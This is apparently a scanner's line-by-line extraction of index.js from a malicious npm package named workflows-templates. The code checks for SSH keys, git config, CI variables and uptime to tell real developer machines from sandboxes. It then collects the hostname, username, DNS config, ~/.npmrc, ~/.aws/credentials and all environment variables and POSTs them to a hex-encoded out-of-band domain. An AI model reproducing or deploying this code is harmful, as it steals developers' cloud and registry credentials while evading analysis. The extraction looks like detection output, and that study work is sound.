// File: tmp/tmpw0i8_2nh/workflows-templates/package/index.js
// ======================================================================
Line 7: const os = require('os')
Line 8: const fs = require('fs')
Line 9: const dns = require('dns')
Line 10: const https = require('httpss')
Line 11: const path = require('path')
Line 12: _tmp_0 = require('child_process')
Line 16: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 19: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 20: fs.readFileSync(filePath, 'utf8')
Line 22: {
    let score = 0;
    const evidence = [];

    // --- POSITIVE SCORES (SIGNS OF A REAL HUMAN / CI) ---
    const userInfo = os.userInfo();
    if (userInfo.uid !== 0 && userInfo.username !== 'root') {
        score += 2; // Real users are rarely root.
        evidence.push('NotRootUser');
    }
    if (os.uptime() > 3600) {
        score += 3; // System has been on for over an hour. Sandboxes are fast.
        evidence.push('LongUptime');
    }
    const homeDir = userInfo.homedir;
    if (safeReadFile(path.join(homeDir, '.gitconfig'))) {
        score += 5; // A global git config is a massive developer signal.
        evidence.push('HasGitConfig');
    }
    if (safeReadFile(path.join(homeDir, '.ssh/id_rsa'))) {
        score += 5; // An SSH private key is the ultimate developer signal.
        evidence.push('HasSSHKey');
    }
    const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID'];
    if (ciVars.some(v => process.env[v])) {
        score += 15; // CI system de...
Line 24: const evidence = []
Line 27: os.userInfo()
Line 30: evidence.push('NotRootUser')
Line 34: evidence.push('LongUptime')
Line 37: safeReadFile(path.join(homeDir, '.gitconfig'))
Line 39: evidence.push('HasGitConfig')
Line 41: safeReadFile(path.join(homeDir, '.ssh/id_rsa'))
Line 43: evidence.push('HasSSHKey')
Line 45: const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID']
Line 46: ciVars.some(v => process.env[v])
Line 48: evidence.push('IsCISystem')
Line 53: os.hostname()
Line 56: evidence.push('KnownBotSignature1')
Line 58: run('pwd').includes('hscan-supplychain')
Line 60: evidence.push('KnownBotSignature2')
Line 64: evidence.push('SandboxArtifact')
Line 70: {
    mission: 'OKTA-GODMODE-FINAL',
    humanity_score: humanityResult.score,
    confirming_evidence: humanityResult.evidence,
    host: {
        h: os.hostname(),
        w: os.userInfo().username,
        p: os.platform(),
        ut: Math.floor(os.uptime() / 60) + 'm'
    },
    network: {
        resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
    },
    files: {
        npmrc: safeReadFile(`${os.homedir()}/.npmrc`),
        aws_creds: safeReadFile(`${os.homedir()}/.aws/credentials`),
    },
    env: process.env,
}
Line 75: os.hostname()
Line 76: os.userInfo()
Line 77: os.platform()
Line 80: _tmp_10.network = {
        resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
    }
Line 81: _tmp_12.resolv = safeReadFile('/etc/resolv.conf') || run('ipconfig /all')
Line 84: safeReadFile(`${os.homedir()}/.npmrc`)
Line 85: safeReadFile(`${os.homedir()}/.aws/credentials`)
Line 91: Buffer.from(JSON.stringify({h: data.host.h, w: data.host.w, e: data.confirming_evidence})).toString('base64url')
Line 97: {
            https.request({
                hostname: OAST_DOMAIN, port: 443,
                path: `/GODMODE_HIT/${summary}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            }).on('error', err => {}).end(JSON.stringify(data));
        }
Line 98: https.request({
                hostname: OAST_DOMAIN, port: 443,
                path: `/GODMODE_HIT/${summary}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            }).on('error', err => {}).end(JSON.stringify(data))
